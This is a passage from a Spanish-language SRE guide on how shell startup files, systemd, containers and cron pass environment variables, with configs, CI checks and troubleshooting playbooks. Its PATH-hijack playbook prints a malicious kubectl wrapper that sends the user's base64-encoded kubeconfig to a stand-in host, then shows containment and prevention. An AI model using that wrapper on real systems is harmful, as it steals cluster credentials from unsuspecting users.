      PLATFORM_ENV=production;      export PLATFORM_ENV
      KUBE_EDITOR=vim;              export KUBE_EDITOR

  # /etc/skel is written BEFORE cloud-init creates the users above,
  # because write_files runs at cc_write_files (init stage) and users are
  # created at cc_users_groups. New accounts therefore inherit these files.
  - path: /etc/skel/.bash_profile
    owner: root:root
    permissions: "0644"
    content: |
      case ":${PATH}:" in
          *":${HOME}/.local/bin:"*) ;;
          *) PATH="${HOME}/.local/bin${PATH:+:${PATH}}" ;;
      esac
      export PATH
      export EDITOR=vim VISUAL=vim PAGER=less
      [ -n "${BASH_VERSION-}" ] && [ -f "$HOME/.bashrc" ] && . "$HOME/.bashrc"

  - path: /etc/skel/.bashrc
    owner: root:root
    permissions: "0644"
    content: |
      case $- in *i*) ;; *) return ;; esac
      HISTCONTROL=ignoreboth:erasedups
      HISTSIZE=100000
      HISTFILESIZE=200000
      HISTTIMEFORMAT='%F %T '
      shopt -s histappend checkwinsize globstar checkhash
      PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '
      PS4='+ ${BASH_SOURCE[0]:-main}:${LINENO}: '
      PROMPT_COMMAND='history -a'
      alias ls='ls --color=auto'
      alias ll='ls -lah --color=auto'
      alias grep='grep --color=auto'
      mkcd() { mkdir -p -- "$1" && cd -- "$1" || return 1; }

runcmd:
  # Prove the layer works on this boot; fail the instance loudly if not.
  - [ /bin/bash, -lc, 'command -v platformctl >/dev/null || { echo "FATAL: toolchain not on login PATH" >&2; exit 1; }' ]
  - [ /bin/sh, -n, /etc/profile.d/10-platform-path.sh ]
  - [ /bin/bash, -lc, 'printenv PATH | grep -q "^/opt/toolchain/bin:"' ]

final_message: "shell environment converged after $UPTIME seconds"
```

Verificación después del primer arranque:

```bash
$ cloud-init status --long
status: done
extended_status: done
boot_status_code: enabled-by-generator
last_update: Wed, 26 Aug 2026 10:12:44 +0000
detail: DataSourceNoCloud [seed=/var/lib/cloud/seed/nocloud]

$ sudo cloud-init schema --system --annotate
Valid schema /var/lib/cloud/instances/i-0a3f/cloud-config.txt

$ ssh sre@node01 'bash -lc "printenv PATH"'
/home/sre/.local/bin:/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### 7.3 `systemd` — el entorno para cosas que nunca ven un shell

`/etc/systemd/system/platform-exporter.service`:

```ini
[Unit]
Description=Platform metrics exporter
Documentation=https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html
After=network-online.target
Wants=network-online.target

[Service]
Type=notify
User=svc-exporter
Group=svc-exporter

# systemd does NOT execute a shell: /etc/profile, /etc/profile.d, ~/.bashrc,
# ~/.bash_profile and /etc/environment are ALL bypassed. Everything the
# process needs must be declared here.
Environment="PLATFORM_ENV=production"
Environment="PLATFORM_REGION=eu-central-1"
Environment="GOMAXPROCS=4"
Environment="PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# KEY=value only; parsed with allexport semantics, not executed as a script.
EnvironmentFile=-/etc/default/platform-exporter
EnvironmentFile=-/etc/platform/secrets.env

WorkingDirectory=/var/lib/platform-exporter
ExecStartPre=/usr/bin/env sh -c 'test -n "$PLATFORM_REGION" || { echo "PLATFORM_REGION unset" >&2; exit 78; }'
ExecStart=/opt/toolchain/bin/platform-exporter --listen=127.0.0.1:9101
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure
RestartSec=5s

NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/lib/platform-exporter
CapabilityBoundingSet=
SystemCallFilter=@system-service

[Install]
WantedBy=multi-user.target
```

`/etc/default/platform-exporter`:

```sh
# systemd EnvironmentFile: KEY=value, one per line.
# NOT a shell script: no `export`, no $(...), no conditionals.
# Quotes are stripped; a line without '=' is an error.
PLATFORM_SCRAPE_INTERVAL=30s
PLATFORM_LOG_LEVEL=info
PLATFORM_TENANT="acme-prod"
```

Verificá qué recibió realmente la unidad — nunca supongas:

```bash
$ systemctl cat platform-exporter.service | head -5
# /etc/systemd/system/platform-exporter.service
[Unit]
Description=Platform metrics exporter

$ systemctl show platform-exporter.service --property=Environment
Environment=PLATFORM_ENV=production PLATFORM_REGION=eu-central-1 GOMAXPROCS=4 PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ systemctl show platform-exporter.service --property=EnvironmentFiles
EnvironmentFiles=/etc/default/platform-exporter (ignore_errors=yes) /etc/platform/secrets.env (ignore_errors=yes)

$ pid=$(systemctl show -p MainPID --value platform-exporter.service)
$ sudo tr '\0' '\n' < /proc/"$pid"/environ | sort
GOMAXPROCS=4
HOME=/var/lib/platform-exporter
INVOCATION_ID=8f2c1d4a9b6e4f0e8d1c2b3a4e5f6071
JOURNAL_STREAM=8:41922
LANG=en_US.UTF-8
LOGNAME=svc-exporter
NOTIFY_SOCKET=/run/systemd/notify
PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PLATFORM_ENV=production
PLATFORM_LOG_LEVEL=info
PLATFORM_REGION=eu-central-1
PLATFORM_SCRAPE_INTERVAL=30s
PLATFORM_TENANT=acme-prod
USER=svc-exporter
```

Valores por defecto para toda la flota, si no queda otra:

```bash
$ sudo mkdir -p /etc/systemd/system.conf.d
$ sudo tee /etc/systemd/system.conf.d/10-platform-env.conf >/dev/null <<'EOF'
[Manager]
DefaultEnvironment=PLATFORM_REGION=eu-central-1 PLATFORM_ENV=production
EOF
$ sudo systemctl daemon-reexec
$ systemctl show-environment
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PLATFORM_ENV=production
PLATFORM_REGION=eu-central-1
```

### 7.4 Contenedores y Kubernetes — donde desaparece todo archivo de arranque

Un `ENTRYPOINT` de contenedor lo ejecuta el runtime directamente con `execve`. No hay login, no hay PAM, no hay `/etc/profile`. Cualquier cosa que pongas en `/etc/profile.d` dentro de una imagen es código muerto a menos que algo invoque un shell de login.

`Dockerfile`:

```dockerfile
FROM debian:12-slim

# Image-level environment: this becomes the container's environ at exec time.
# It reaches EVERY process in the container, shell or not. This is the
# container equivalent of /etc/environment.
ENV LANG=C.UTF-8 \
    LC_ALL=C.UTF-8 \
    PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
    PLATFORM_ENV=production \
    DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
 && apt-get install -y --no-install-recommends bash ca-certificates curl jq less procps \
 && rm -rf /var/lib/apt/lists/*

COPY --chmod=0755 toolchain/ /opt/toolchain/bin/

# Interactive niceties for `kubectl exec -it ... -- bash`.
# kubectl exec starts an interactive NON-LOGIN shell: it reads ~/.bashrc,
# NOT /etc/profile. Put operator ergonomics in the bashrc path.
COPY --chmod=0644 container/bashrc /etc/bash.bashrc
COPY --chmod=0644 container/bashrc /root/.bashrc

# Login-shell files, for entrypoints that explicitly use `bash -lc`.
COPY --chmod=0644 container/profile.d/ /etc/profile.d/

RUN useradd --system --uid 65532 --gid 0 --home-dir /home/nonroot \
        --create-home --shell /usr/sbin/nologin nonroot \
 && cp /etc/bash.bashrc /home/nonroot/.bashrc \
 && chown -R 65532:0 /home/nonroot && chmod -R g=u /home/nonroot

USER 65532:0
WORKDIR /home/nonroot

# exec form: NO shell is involved, so $VARS are not expanded here and no
# startup file is read. The ENV above is the entire environment.
ENTRYPOINT ["/opt/toolchain/bin/platform-exporter"]
CMD ["--listen=0.0.0.0:9101"]
```

`k8s/toolbox.yaml` — un conjunto de manifiestos completo y válido que demuestra los tres canales de entorno:

```yaml
---
apiVersion: v1
kind: Namespace
metadata:
  name: platform-tools
  labels:
    pod-security.kubernetes.io/enforce: baseline
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: shell-profile
  namespace: platform-tools
  labels:
    app.kubernetes.io/name: toolbox
    app.kubernetes.io/component: shell-environment
data:
  # Mounted at /etc/profile.d/ — only executed when something runs `bash -l`.
  10-platform-path.sh: |
    # POSIX sh: also read by dash-based images.
    path_prepend() {
        [ -d "$1" ] || return 0
        case ":${PATH}:" in *":$1:"*) return 0 ;; esac
        PATH="$1${PATH:+:$PATH}"
    }
    path_prepend /opt/toolchain/bin
    path_prepend /usr/local/bin
    export PATH
    unset -f path_prepend

  20-platform-exports.sh: |
    KUBE_EDITOR=vim;   export KUBE_EDITOR
    PAGER=less;        export PAGER
    LESS="-R -F -X -i"; export LESS

  # Mounted at /etc/bash.bashrc — read by `kubectl exec -it -- bash`
  # (interactive, non-login). This is the file operators actually feel.
  bashrc: |
    case $- in *i*) ;; *) return ;; esac
    HISTFILE=/dev/null            # ephemeral pod: do not pretend to persist history
    HISTCONTROL=ignoreboth
    shopt -s checkwinsize globstar
    PS1='\[\e[1;35m\]toolbox\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]$ '
    PS4='+ ${BASH_SOURCE[0]:-main}:${LINENO}: '
    alias k=kubectl
    alias ll='ls -lah --color=auto'
    alias grep='grep --color=auto'
    kns() { kubectl config set-context --current --namespace="${1:?usage: kns <ns>}"; }
    kctx() { kubectl config use-context "${1:?usage: kctx <context>}"; }
    printf 'toolbox %s on %s — namespace %s\n' \
        "${TOOLBOX_VERSION:-dev}" "${NODE_NAME:-?}" "${POD_NAMESPACE:-?}"
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: platform-env
  namespace: platform-tools
data:
  PLATFORM_ENV: production
  PLATFORM_REGION: eu-central-1
  TOOLBOX_VERSION: "2026.08.3"
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: toolbox
  namespace: platform-tools
  labels:
    app.kubernetes.io/name: toolbox
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: toolbox
  template:
    metadata:
      labels:
        app.kubernetes.io/name: toolbox
    spec:
      terminationGracePeriodSeconds: 5
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        runAsGroup: 0
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: toolbox
          image: registry.example.com/platform/toolbox:2026.08.3
          imagePullPolicy: IfNotPresent

          # CHANNEL 1 — container environment. Reaches every process,
          # shell or not. This is the only channel a non-shell ENTRYPOINT sees.
          envFrom:
            - configMapRef:
                name: platform-env
          env:
            - name: NODE_NAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
            - name: POD_NAMESPACE
              valueFrom:
                fieldRef:
                  fieldPath: metadata.namespace
            - name: HOME
              value: /home/nonroot

          # CHANNEL 2 — login-shell files. Only effective because the
          # command below is an explicit LOGIN shell (`bash -l`).
          # CHANNEL 3 — /etc/bash.bashrc, for `kubectl exec -it -- bash`.
          command: ["/bin/bash", "-l", "-c"]
          args:
            - |
              set -Eeuo pipefail
              printf 'toolbox up on %s, PATH=%s\n' "${NODE_NAME}" "${PATH}"
              command -v kubectl >/dev/null || { echo "kubectl missing from login PATH" >&2; exit 1; }
              exec sleep infinity

          volumeMounts:
            - name: shell-profile
              mountPath: /etc/profile.d/10-platform-path.sh
              subPath: 10-platform-path.sh
              readOnly: true
            - name: shell-profile
              mountPath: /etc/profile.d/20-platform-exports.sh
              subPath: 20-platform-exports.sh
              readOnly: true
            - name: shell-profile
              mountPath: /etc/bash.bashrc
              subPath: bashrc
              readOnly: true

          resources:
            requests: { cpu: "10m", memory: "32Mi" }
            limits:   { cpu: "200m", memory: "256Mi" }

          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]

      volumes:
        - name: shell-profile
          configMap:
            name: shell-profile
            defaultMode: 0444
      tolerations:
        - operator: Exists
```

Probá cada canal por separado:

```bash
$ kubectl apply -f k8s/toolbox.yaml
namespace/platform-tools created
configmap/shell-profile created
configmap/platform-env created
daemonset.apps/toolbox created

$ kubectl -n platform-tools rollout status ds/toolbox
daemon set "toolbox" successfully rolled out

$ kubectl -n platform-tools logs ds/toolbox | head -1
toolbox up on worker-03, PATH=/opt/toolchain/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin

# Channel 1: container env — present regardless of shell type
$ kubectl -n platform-tools exec ds/toolbox -- printenv PLATFORM_REGION
eu-central-1

# Non-interactive, non-login: reads NOTHING. profile.d never runs.
$ kubectl -n platform-tools exec ds/toolbox -- bash -c 'type kns 2>&1; echo "PATH=$PATH"'
bash: line 1: type: kns: not found
PATH=/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Explicit login shell: profile.d runs
$ kubectl -n platform-tools exec ds/toolbox -- bash -lc 'printenv KUBE_EDITOR'
vim

# Interactive: /etc/bash.bashrc runs, aliases and functions appear
$ kubectl -n platform-tools exec -it ds/toolbox -- bash
toolbox 2026.08.3 on worker-03 — namespace platform-tools
toolbox:/home/nonroot$ type kns
kns is a function
kns () 
{ 
    kubectl config set-context --current --namespace="${1:?usage: kns <ns>}"
}
toolbox:/home/nonroot$ exit
```

El tercer y el cuarto comando son toda la lección de §2 dentro de un contenedor: misma imagen, mismo nodo, distinto tipo de shell, distinto entorno.

### 7.5 Validación en CI — tratá la configuración del shell como código

`.github/workflows/shell-env.yml`:

```yaml
---
name: shell-environment
on:
  push:
    paths:
      - 'roles/shell_environment/**'
      - 'k8s/toolbox.yaml'
      - '.github/workflows/shell-env.yml'
  pull_request:

jobs:
  lint:
    name: Lint shell startup files
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4

      - name: Install linters
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends shellcheck dash bats

      - name: POSIX syntax check for /etc/profile.d snippets
        run: |
          set -euo pipefail
          fail=0
          for f in roles/shell_environment/files/profile.d/*.sh; do
            if ! dash -n "$f"; then
              echo "::error file=$f::not POSIX sh — /etc/profile is read by dash on Debian"
              fail=1
            fi
          done
          exit "$fail"

      - name: ShellCheck the skeleton and library (bash dialect)
        run: |
          shellcheck --shell=bash --severity=style \
            roles/shell_environment/files/skel/.bashrc \
            roles/shell_environment/files/skel/.bash_profile \
            roles/shell_environment/files/sre.sh

      - name: ShellCheck the POSIX files
        run: |
          shellcheck --shell=sh --severity=style \
            roles/shell_environment/files/skel/.profile \
            roles/shell_environment/files/profile.d/*.sh

      - name: Assert .bashrc has an interactivity guard in its first 10 lines
        run: |
          set -euo pipefail
          head -10 roles/shell_environment/files/skel/.bashrc \
            | grep -qE 'case \$- in|\[\[ \$- ' \
            || { echo "::error::.bashrc must return early when non-interactive"; exit 1; }

      - name: Assert .bashrc is silent when non-interactive
        run: |
          set -euo pipefail
          out=$(HOME=$PWD bash --rcfile roles/shell_environment/files/skel/.bashrc \
                  -c 'true' 2>&1 || true)
          if [ -n "$out" ]; then
            echo "::error::.bashrc wrote to stdout/stderr non-interactively: $out"
            exit 1
          fi

      - name: Assert PATH mutation is idempotent
        run: |
          set -euo pipefail
          before=$(sh -c '. roles/shell_environment/files/profile.d/10-platform-path.sh; echo "$PATH"')
          after=$(sh -c '. roles/shell_environment/files/profile.d/10-platform-path.sh
                         . roles/shell_environment/files/profile.d/10-platform-path.sh
                         . roles/shell_environment/files/profile.d/10-platform-path.sh
                         echo "$PATH"')
          [ "$before" = "$after" ] || {
            echo "::error::PATH grew on repeated sourcing"
            printf 'before: %s\nafter:  %s\n' "$before" "$after"
            exit 1
          }

      - name: bats unit tests for shell functions
        run: bats roles/shell_environment/tests/
```

`roles/shell_environment/tests/functions.bats`:

```bash
#!/usr/bin/env bats

setup() {
    # shellcheck source=../files/sre.sh
    source "${BATS_TEST_DIRNAME}/../files/sre.sh"
}

@test "path_prepend adds a directory exactly once" {
    source "${BATS_TEST_DIRNAME}/../files/profile.d/10-platform-path.sh" || true
    PATH="/usr/bin:/bin"
    mkdir -p "${BATS_TMPDIR}/tool"
    path_prepend() { case ":${PATH}:" in *":$1:"*) return 0;; esac; PATH="$1:$PATH"; }
    path_prepend "${BATS_TMPDIR}/tool"
    path_prepend "${BATS_TMPDIR}/tool"
    run awk -v RS=: -v d="${BATS_TMPDIR}/tool" 'END{}$0==d{n++}END{print n+0}' <<<"$PATH"
    [ "$output" -eq 1 ]
}

@test "p_ctx returns a dash when no kubeconfig context exists" {
    KUBECONFIG=/nonexistent run p_ctx
    [ "$status" -eq 0 ]
    [ "$output" = "-" ]
}
```

---

## 8. Verificación y diagnóstico de fallas

### 8.1 El arnés de trazado — ver exactamente qué archivos lee un shell

`bash -x` desde la primerísima instrucción, con un `PS4` que nombra el archivo:

```bash
$ PS4='+ ${BASH_SOURCE[0]:-main}:${LINENO}: ' bash -lixc 'true' 2>&1 | grep -E '^\+ /' | head -20
+ /etc/profile:3: PS1='\h:\w\$ '
+ /etc/profile:7: [ -d /etc/profile.d ]
+ /etc/profile:8: for i in /etc/profile.d/*.sh
+ /etc/profile.d/10-platform-path.sh:5: path_prepend /opt/toolchain/bin
+ /etc/profile.d/10-platform-path.sh:20: export PATH
+ /etc/profile.d/20-platform-exports.sh:2: PLATFORM_REGION=eu-central-1
+ /etc/profile.d/50-platform-lib.sh:4: case himBHs in
+ /etc/profile.d/50-platform-lib.sh:12: . /usr/local/lib/platform/sre.sh
+ /etc/profile.d/90-platform-interactive.sh:6: umask 0027
+ /etc/profile.d/90-platform-interactive.sh:9: TMOUT=900
+ /home/sre/.bash_profile:12: export PATH
+ /home/sre/.bash_profile:24: . /home/sre/.bashrc
+ /home/sre/.bashrc:8: HISTCONTROL=ignoreboth:erasedups
+ /home/sre/.bashrc:33: PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '
```

Trazá solo las *aperturas* de archivos, incluidas las que fallan — esta es la respuesta definitiva a "¿qué archivo de profile está usando realmente mi sistema?":

```bash
$ strace -f -e trace=openat -o /tmp/startup.trace bash -lic 'exit' >/dev/null 2>&1
$ grep -E '(profile|bashrc|bash_login|bash_logout|environment)' /tmp/startup.trace
openat(AT_FDCWD, "/etc/profile", O_RDONLY)                = 3
openat(AT_FDCWD, "/etc/profile.d/10-platform-path.sh", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/profile.d/20-platform-exports.sh", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/profile.d/50-platform-lib.sh", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/profile.d/90-platform-interactive.sh", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/bash.bashrc", O_RDONLY)            = 3
openat(AT_FDCWD, "/home/sre/.bash_profile", O_RDONLY)     = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/home/sre/.bash_login", O_RDONLY)       = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/home/sre/.profile", O_RDONLY)          = 3
openat(AT_FDCWD, "/home/sre/.bashrc", O_RDONLY)           = 3
openat(AT_FDCWD, "/home/sre/.bash_logout", O_RDONLY)      = 3
```

Las tres líneas consecutivas de `.bash_profile` → `.bash_login` → `.profile` **son** la regla de precedencia de §2.2, observada en vez de recitada. Dos `ENOENT` y un éxito: la cadena se detuvo en el primer archivo legible.

Medir el costo del arranque — un prompt sobrecargado es un bug de latencia real:

```bash
$ time bash -lic 'exit'
real	0m0.412s
user	0m0.221s
sys	0m0.108s

$ time bash --noprofile --norc -c 'exit'
real	0m0.004s
user	0m0.001s
sys	0m0.003s
```

400 ms por shell, multiplicados por cada `ssh` de cada corrida de Ansible, son la diferencia entre un playbook de 3 minutos y uno de 20.

### 8.2 Diagnóstico diferencial: hacé diff de los entornos

La ruta más rápida de "acá funciona, allá no" a una causa raíz:

```bash
$ diff <(ssh sre@node01 'printenv | sort') \
       <(ssh sre@node01 'bash -lc "printenv | sort"')
2a3
> JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
5c6
< PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
---
> PATH=/home/sre/.local/bin:/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
8a10
> PLATFORM_REGION=eu-central-1
```

Lectura: el comando SSH sin login se pierde `JAVA_HOME`, el `PATH` del toolchain y `PLATFORM_REGION`, porque `/etc/profile.d` nunca se ejecutó. Dos arreglos aceptables, en orden de preferencia:

1. Mover las variables a `/etc/environment` (llega a toda sesión PAM, incluida cron), **o**
2. Hacer que el invocante use `bash -lc` — pero esto solo sirve para los invocantes que vos controlás.

Capturar el entorno de cron, que nada más reproduce fielmente:

```bash
$ ( crontab -l 2>/dev/null; echo '* * * * * /usr/bin/env > /tmp/cron.env 2>&1' ) | crontab -
$ sleep 65
$ sort /tmp/cron.env
HOME=/home/sre
LANG=en_US.UTF-8
LOGNAME=sre
PATH=/usr/bin:/bin
PWD=/home/sre
SHELL=/bin/sh
USER=sre

$ diff <(sort /tmp/cron.env) <(ssh sre@localhost 'bash -lc "env"' | sort) | grep '^>' | cut -c3-
JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
PATH=/home/sre/.local/bin:/opt/toolchain/bin:/usr/local/sbin:...
PLATFORM_REGION=eu-central-1
...
$ crontab -l | grep -v '/tmp/cron.env' | crontab -    # clean up
```

Notá que `LANG` sobrevivió hasta cron (vía `pam_env` leyendo `/etc/environment`) mientras que el `PATH` de `profile.d` no. Esa asimetría es la razón práctica por la que existe `/etc/environment`.

### 8.3 Síntoma → causa → sonda → remediación

| Síntoma | Causa más probable | Sonda | Remediación |
|---|---|---|---|
| `command not found` en cron, funciona en la terminal | `profile.d` no leído; `PATH=/usr/bin:/bin` | `* * * * * env > /tmp/c.env` | Rutas absolutas en el job, o línea `PATH=` al principio del crontab |
| Faltan alias tras el login por consola, presentes en `tmux` | `~/.bash_profile` existe y le falta el gancho a `~/.bashrc` | `strace -e openat bash -lic exit` | Agregar `[ -f ~/.bashrc ] && . ~/.bashrc` a `~/.bash_profile` |
| Las ediciones de `~/.profile` no tienen efecto | `~/.bash_profile` o `~/.bash_login` lo eclipsa | `ls -la ~/.bash_profile ~/.bash_login ~/.profile` | Consolidar en un solo archivo |
| `scp`/`rsync`/`sftp`: `protocol error` / `unexpected tag` | `~/.bashrc` escribe en stdout | `ssh host true \| wc -c` → debe imprimir `0` | Mover la salida debajo del guard `case $- in *i*` |
| `sudo cmd` no encuentra una herramienta que el usuario sí puede ejecutar | `secure_path` sobrescribe el `PATH` | `sudo printenv PATH; sudo -l` | Drop-in que extienda `secure_path`; nunca deshabilitar `env_reset` |
| El binario actualizado sigue ejecutando la versión vieja | Tabla hash de bash | `type -a cmd; hash` | `hash -r`; activar `shopt -s checkhash` |
| Servicio de `systemd`: variable sin definir, funciona a mano | Sin shell → sin archivos de arranque | `systemctl show -p Environment unit` | `Environment=` / `EnvironmentFile=` |
| Los usuarios nuevos reciben la config, los existentes no | `/etc/skel` aplica solo al crear | `cmp ~user/.bashrc /etc/skel/.bashrc` | Mover la política a `/etc/profile.d` |
| Errores de login: `[[: not found`, `Syntax error: "(" unexpected` | Bashismo en `/etc/profile.d/*.sh`, leído por dash | `sh -n /etc/profile.d/*.sh` | Reescribir en POSIX, o proteger con `[ -n "$BASH_VERSION" ]` |
| La sesión muere a los 15 min | `TMOUT` definido como solo lectura | `declare -p TMOUT` | Ajustar la política de forma centralizada; el `ClientAliveInterval` de `sshd` es el control real |
| El `PATH` tiene 900 caracteres tras anidar shells | Append incondicional en `~/.bashrc` | `awk -v RS=: 'END{print NR}' <<<"$PATH"` | Guard de `path_prepend`; poner `PATH` en `~/.bash_profile`, no en `~/.bashrc` |
| El orden del sort difiere entre la laptop y CI | `LANG`/`LC_COLLATE` importados vía `SendEnv`/`AcceptEnv` | `ssh host locale` | `export LC_ALL=C` al principio de todo script que parsee |
| `su user` no tiene el entorno; `su - user` sí | Sin login vs. login | `su -c 'shopt -q login_shell; echo $?' user` | Usar `su -` / `sudo -i` |
| Función indefinida en un script que "funcionaba interactivamente" | Las funciones no se heredan salvo que se exporten o se lean con source | `type -t fn` dentro del script | Leer la biblioteca explícitamente con source en el script |
| Contenedor: se ignora `/etc/profile.d` | `ENTRYPOINT` hace exec directo | `kubectl exec pod -- printenv PATH` | Usar `ENV` de la imagen, o `bash -lc` en `command` |

### 8.4 Playbook resuelto A — la transferencia `scp` corrompida

```bash
$ scp backup.tar.gz sre@node07:/srv/backups/
protocol error: filename does not match request

$ ssh sre@node07 true | wc -c
28

$ ssh sre@node07 true
Welcome to node07 — prod cluster

$ ssh sre@node07 'grep -n "Welcome" ~/.bashrc'
3:echo "Welcome to $(hostname) — prod cluster"
5:case $- in *i*) ;; *) return ;; esac
```

El guard existe pero está **después** del `echo`. El orden es el bug:

```bash
$ ssh sre@node07 'sed -i "3d" ~/.bashrc && sed -i "2a echo \"Welcome to \$(hostname) — prod cluster\"" ~/.bashrc'
$ ssh sre@node07 'head -4 ~/.bashrc'
# ~/.bashrc
case $- in *i*) ;; *) return ;; esac
echo "Welcome to $(hostname) — prod cluster"

$ ssh sre@node07 true | wc -c
0
$ scp backup.tar.gz sre@node07:/srv/backups/
backup.tar.gz                              100%  482MB  118.4MB/s   00:04
```

**Invariante a imponer en CI:** `ssh host true | wc -c` debe dar `0`. Es un test de una línea, y atrapa toda una clase de caída.

### 8.5 Playbook resuelto B — cron no encuentra nada

```bash
$ grep CRON /var/log/syslog | tail -2
Aug 26 03:17:01 node01 CRON[41123]: (sre) CMD (backup-run --profile nightly)
Aug 26 03:17:01 node01 CRON[41122]: (CRON) info (No MTA installed, discarding output)

$ sudo -u sre env -i HOME=/home/sre SHELL=/bin/sh PATH=/usr/bin:/bin \
    /bin/sh -c 'backup-run --profile nightly'
/bin/sh: 1: backup-run: not found

$ command -v backup-run
/opt/toolchain/bin/backup-run
```

Reproducí, no teorices: `env -i` con exactamente las variables de cron vuelve determinista la falla. Tres remediaciones, ordenadas:

```bash
# 1. Best: absolute path. Zero environment dependency.
$ crontab -l
17 3 * * * /opt/toolchain/bin/backup-run --profile nightly

# 2. Acceptable: declare PATH in the crontab itself (crontab(5) supports assignments)
$ crontab -l
PATH=/opt/toolchain/bin:/usr/local/bin:/usr/bin:/bin
MAILTO=sre-oncall@example.com
17 3 * * * backup-run --profile nightly

# 3. Fleet-wide: put it in /etc/environment, which pam_env exposes to cron
$ grep ^PATH /etc/environment
PATH="/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

Nunca uses `SHELL=/bin/bash` + `bash -lc` en un crontab como arreglo principal: eso hace que un job programado dependa de los dotfiles de un usuario, que es exactamente el acoplamiento que estás tratando de eliminar. Preferí un timer de `systemd` con un `Environment=` explícito.

### 8.6 Playbook resuelto C — el secuestro del `PATH`

```bash
$ ls -l /opt/vendor/bin/
total 12
-rwxrwxr-x 1 root developers 8192 Aug 24 14:02 vendorctl
-rwxrwxr-x 1 mallory developers  61 Aug 26 02:11 kubectl

$ cat /opt/vendor/bin/kubectl
#!/bin/sh
curl -s https://exfil.example/`base64 -w0 ~/.kube/config` >/dev/null
exec /usr/bin/kubectl "$@"

$ echo "$PATH"
/opt/vendor/bin:/usr/local/bin:/usr/bin:/bin
$ type -a kubectl
kubectl is /opt/vendor/bin/kubectl
kubectl is /usr/bin/kubectl
```

Un directorio escribible por el grupo colocado **antes** de los directorios del sistema es una primitiva completa de sustitución de comandos. Contención:

```bash
$ sudo chmod g-w /opt/vendor/bin
$ sudo rm -f /opt/vendor/bin/kubectl
$ hash -r
$ type kubectl
kubectl is /usr/bin/kubectl

# Prevention: system directories first, vendor last, and audit the mode.
$ sudo tee /etc/profile.d/10-platform-path.sh >/dev/null <<'EOF'
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
for d in /opt/toolchain/bin /opt/vendor/bin; do
    [ -d "$d" ] || continue
    case "$(stat -c %A "$d")" in
        *w*w*|*w*t*) continue ;;      # refuse group/other-writable entries
    esac
    PATH="${PATH}:${d}"
done
export PATH
unset d
EOF
```

Reglas de diseño que se desprenden de esto: **nunca pongas un directorio escribible delante de `/usr/bin`; nunca pongas `.` ni un campo vacío en el `PATH`, punto; mantené `secure_path` acotado.**

### 8.7 Playbook resuelto D — el esqueleto eclipsado

```bash
$ ssh bob@node01 'command -v platformctl || echo MISSING'
MISSING
$ ssh alice@node01 'command -v platformctl || echo MISSING'
/opt/toolchain/bin/platformctl

$ ssh bob@node01 'ls -la ~/.bash_profile ~/.bash_login ~/.profile 2>&1'
-rw-r--r-- 1 bob bob   58 Feb  3  2024 /home/bob/.bash_profile
ls: cannot access '/home/bob/.bash_login': No such file or directory
-rw-r--r-- 1 bob bob  807 Feb  3  2024 /home/bob/.profile

$ ssh bob@node01 'cat ~/.bash_profile'
PATH=/usr/local/bin:/usr/bin:/bin
export PATH

$ ssh bob@node01 'PS4="+ \${BASH_SOURCE[0]}:\${LINENO}: " bash -lxc true 2>&1 | tail -3'
+ /home/bob/.bash_profile:1: PATH=/usr/local/bin:/usr/bin:/bin
+ /home/bob/.bash_profile:2: export PATH
+ /home/bob/.bashrc: not sourced
```

Dos defectos independientes: `~/.bash_profile` **sobrescribe** el `PATH` en lugar de extenderlo (descartando todo lo que aportó `/etc/profile.d`), y nunca lee `~/.bashrc` con source. Arreglo in situ, preservando la intención del usuario:

```bash
$ ssh bob@node01 'cat > ~/.bash_profile' <<'EOF'
# Extend PATH, never replace it: /etc/profile.d has already run.
case ":${PATH}:" in
    *":${HOME}/.local/bin:"*) ;;
    *) PATH="${HOME}/.local/bin${PATH:+:${PATH}}" ;;
esac
export PATH
